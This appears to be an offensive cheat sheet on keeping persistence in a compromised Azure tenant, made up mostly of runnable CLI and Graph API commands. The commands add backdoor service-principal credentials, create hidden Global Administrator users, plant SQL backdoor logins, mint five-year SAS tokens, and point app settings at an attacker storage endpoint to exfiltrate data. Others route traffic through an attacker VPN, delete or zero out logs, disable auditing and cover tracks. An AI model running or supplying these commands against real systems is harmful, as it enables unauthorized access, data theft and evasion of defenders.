# Azure Persistence

Persistence in Azure involves establishing access that survives credential changes, authentication resets, and service restarts.

## Service Principal Persistence

### Secondary Credential Creation

```bash
# If you compromise service principal owner user
# Add new credentials to service principal

TENANT_ID="your-tenant-id"
APP_ID="compromised-app-id"

# Create new credential (password)
NEW_CRED=$(curl -s -X POST https://graph.microsoft.com/v1.0/applications/{appId}/addPassword \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"passwordCredential":{"displayName":"ServiceAccountAccess"}}' | jq -r '.value.secretText')

# Use new credential for persistent access
az login --service-principal \
  --username {clientId} \
  --password "$NEW_CRED" \
  --tenant $TENANT_ID
```

### Add New Application Owner

```bash
# If current identity is app owner, add compromised user as owner
curl -s -X POST https://graph.microsoft.com/v1.0/applications/{appId}/owners/$ref \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"@odata.id":"https://graph.microsoft.com/v1.0/directoryObjects/{backdoorUserId}"}'

# Backdoor user can now manage app credentials
```

## User Account Persistence

### Permanent Password Reset

```bash
# If you have User Access Administrator role
# Permanently reset target user password

az ad user update --id {userId} --force-change-password-next-sign-in false

# Or via Graph API
curl -s -X PATCH https://graph.microsoft.com/v1.0/users/{userId} \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"passwordProfile":{"forceChangePasswordNextSignIn":false,"password":"NewPassword@123"}}'

# Access with new password
az login --username {email} --password "NewPassword@123"
```

### Add Hidden User

```bash
# Create hidden administrative user
# May bypass audit alerts if not visible in normal lists

HIDDEN_USER=$(openssl rand -hex 8)

az ad user create --display-name "Cloud Maintenance" \
  --user-principal-name "$HIDDEN_USER@company.onmicrosoft.com" \
  --password "P@ssw0rd123456"

# Assign high-privilege role
az ad role member add --role "Global Administrator" \
  --member-object-id {userId}

# User exists but may not appear in normal UI listings
```

## Managed Identity Persistence

### Backup Managed Identity

```bash
# If you have high privileges, create backup managed identity
# With same permissions as current identity

az identity create --resource-group {rg} \
  --name "CloudMaintenanceIdentity"

# Assign same roles to backup identity
BACKUP_ID=$(az identity show --resource-group {rg} --name "CloudMaintenanceIdentity" --query 'principalId' -o tsv)

az role assignment create --role "Contributor" \
  --assignee $BACKUP_ID \
  --scope /subscriptions/{subscriptionId}

# Create VM with this managed identity
az vm create --resource-group {rg} \
  --name "CloudMaintenanceVM" \
  --image UbuntuLTS \
  --assign-identity CloudMaintenanceIdentity \
  --admin-username azureuser --generate-ssh-keys
```

### Disable Managed Identity Changes

```bash
# Lock managed identity from being modified
az resource lock create --name BackdoorLock \
  --resource /subscriptions/{subscriptionId}/resourceGroups/{rg}/providers/Microsoft.ManagedIdentity/userAssignedIdentities/{identityName} \
  --lock-type CanNotDelete
```

## Application Backdoors

### Compromised Application Code

```bash
# Deploy modified application version with backdoor
# Via compromised deployment pipeline

# Obtain deployment credentials
az webapp deployment list-publishing-profiles --name {app} --resource-group {rg} \
  --query "[].publishingPassword" -o tsv

# Deploy backdoored code
# Using FTP or Git credentials

# Backdoor: Application logs all authentication attempts
# Sends logs to attacker-controlled storage account
```

### Application Settings Modification

```bash
# Modify app settings to exfiltrate data
az webapp config appsettings set --name {app} --resource-group {rg} \
  --settings \
    EXFIL_ENDPOINT="https://attacker-storage.blob.core.windows.net/logs" \
    EXFIL_KEY="{storageAccountKey}"

# Application reads these settings and sends data to attacker
```

## Storage Account Backdoors

### Shared Access Signature (SAS) Token Backdoor

```bash
# Create long-lived SAS token with access to sensitive containers

ACCOUNT_KEY=$(az storage account keys list --account-name {account} \
  --resource-group {rg} --query '[0].value' -o tsv)

# Create SAS token valid for 5 years
END_DATE=$(date -d '+5 years' '+%Y-%m-%dT%H:%MZ')

CONTAINER=sensitive-data

SAS_TOKEN=$(az storage account generate-sas \
  --account-name {account} \
  --account-key $ACCOUNT_KEY \
  --services bfqt \
  --resource-types co \
  --permissions racwd \
  --expiry $END_DATE \
  --output tsv)

echo "https://{account}.blob.core.windows.net/$CONTAINER?$SAS_TOKEN"

# Store this URL for persistent access
```

### Access Key Rotation Bypass

```bash
# Create secondary access key before rotating primary
# Rotate primary key
az storage account keys renew --account-name {account} --key primary

# But you still have secondary key
# May remain valid during rotation process

SECONDARY_KEY=$(az storage account keys list --account-name {account} --query '[1].value' -o tsv)

# Persistent access via secondary key
```

## Database Backdoors

### SQL Database User Persistence

```bash
# Create SQL user that persists outside Azure AD
# Won't be affected by Azure AD changes

# Connect to database
sqlcmd -S {server}.database.windows.net -d {database} \
  -U {adminUser} -P {adminPassword}

# Create persistent user
CREATE LOGIN BackdoorUser WITH PASSWORD = 'P@ssw0rd123456'
CREATE USER BackdoorUser FROM LOGIN BackdoorUser
ALTER ROLE db_owner ADD MEMBER BackdoorUser
GO

# Later access database as BackdoorUser
# Even if Azure AD is compromised
```

### Transparent Data Encryption (TDE) Key Access

```bash
# Extract TDE encryption key if you have access
# Can decrypt database backups and copies

az sql server key list --server {server} --resource-group {rg}

# Key may be stored in Key Vault accessible to backdoor identity
az keyvault key show --vault-name {vault} --name {keyName}
```

## Key Vault Persistence

### Create Permanent Access Policy

```bash
# If current identity has Key Vault management permissions
# Add permanent access policy for backdoor identity

az keyvault set-policy --name {vault} \
  --object-id {backdoorIdentityObjectId} \
  --secret-permissions get list \
  --key-permissions get list

# Backdoor identity can permanently read secrets
```

### Secret Backdoor

```bash
# Create long-lived secret stored in Key Vault
az keyvault secret set --vault-name {vault} \
  --name "PersistenceBackdoor" \
  --value "{backdoorCredentials}"

# Later retrieve it
az keyvault secret show --vault-name {vault} --name "PersistenceBackdoor" --query 'value'
```

## Log Manipulation

### Azure Monitor Logging Bypass

```bash
# If you have monitoring permissions, manipulate logs

# Delete log analytics data
az monitor log-analytics workspace data-export delete \
  --resource-group {rg} \
  --workspace-name {workspace}

# Modify retention settings
az monitor log-analytics workspace update \
  --resource-group {rg} \
  --workspace-name {workspace} \
  --retention-time 0

# Activity logs are harder to delete but can be limited
az monitor log-profiles update --name default --retention-policy enabled --retention-days 0
```

### Disable Audit Logging

```bash
# If you have appropriate permissions
# Disable auditing on sensitive resources

# SQL Server auditing
az sql server audit-policy update \
  --resource-group {rg} \
  --server {server} \
  --state Disabled

# Storage account logging
az storage logging update --account-name {account} \
  --services b --log-version 2.0 --delete false
```

## Infrastructure Changes Persistence

### Virtual Network Modification

```bash
# Add backdoor route to VNet
az network route-table create --resource-group {rg} --name BackdoorRoutes

az network route-table route create \
  --resource-group {rg} \
  --route-table-name BackdoorRoutes \
  --name TunnelRoute \
  --address-prefix 0.0.0.0/0 \
  --next-hop-type VirtualAppliance \
  --next-hop-ip-address {attacker-vpn-ip}

# All traffic routed through attacker VPN
```

### Network Security Group Persistence

```bash
# Add permanent backdoor access rule
az network nsg rule create --name AllowBackdoor \
  --nsg-name {nsg} \
  --resource-group {rg} \
  --priority 100 \
  --direction Inbound \
  --source-address-prefixes {attacker-ip} \
  --protocol '*' \
  --destination-port-ranges '*'

# Persistent remote access
```

## Cleanup & Detection Evasion

```bash
# Remove persistence indicators
# But keep one backdoor method

# Clean up temporary identities
az ad user delete --id {temporaryUserId}

# Remove suspicious role assignments
az role assignment delete --role "Owner" \
  --assignee {obviousBackdoorId}

# Reduce audit trail
# Keep latest persistence method hidden in legitimate resources

# Monitor for incident response detection
az monitor alert list --resource-group {rg}
```

## Key Findings

- Permanent service principal credentials
- Hidden administrative users
- Backup managed identities with high privileges
- Compromised application deployment pipelines
- Permanent SAS tokens with broad access
- SQL database users outside Azure AD
- Disabled or manipulated audit logging
- Modified network routes or firewall rules
